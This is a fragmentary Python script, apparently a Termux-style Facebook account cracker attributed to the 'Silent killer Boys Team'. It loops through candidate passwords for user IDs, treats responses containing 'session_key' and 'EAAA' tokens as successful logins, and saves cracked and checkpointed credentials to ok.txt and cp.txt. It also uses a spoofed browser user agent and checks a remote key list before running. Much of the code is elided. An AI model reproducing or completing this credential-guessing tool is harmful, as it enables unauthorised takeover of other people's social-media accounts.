...
_____ _    _       _______                   
 ...
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr. X Alamin Vau\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-X ALAMIN \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Skb-Teamxd \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/MUH41M1NUL.I5L4M.H451B \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Atalamin/run.txt/blob/main/run.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/akaahkhan.shuvo")
...
def notice():
	...
	os.system("xdg-open https://facebook.com/groups/665244508537625//?app=fbl")
	...
	os.system("xdg-open https://www.facebook.com/groups/1066506027528015/permalink/1126832058162078/?app=fbl")
	subprocess.check_output(["am", "start", "https://facebook.com/groups/665244508537625//?app=fbl"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Atalamin/run.txt/blob/main/run.txt').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Silent killer Boys Team \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/@bdfollowbazar"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=SKB=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=SKB=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=SKB=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=SKB=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #By copying your name Dal Dyna
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    :Alamin & Hasib  ")
		print(" [*] Team      : Silent killer Boys Team \n")
		print(" [ Sosial Media  ] Facebook \n")
		print(" [*] Facebook  : https://www.facebook.com/MUH41M1NUL.I5L4M.H451B ")
		print(" [*] Instagram : https://instagram.com/@skb.team.2022 ")
		print(" [*] YouTube   : https://youtube.com/@bdgollowbazar ")
		exit(" [*] GitHub    : https://github.com/atalamin ")
	else:
		Main()
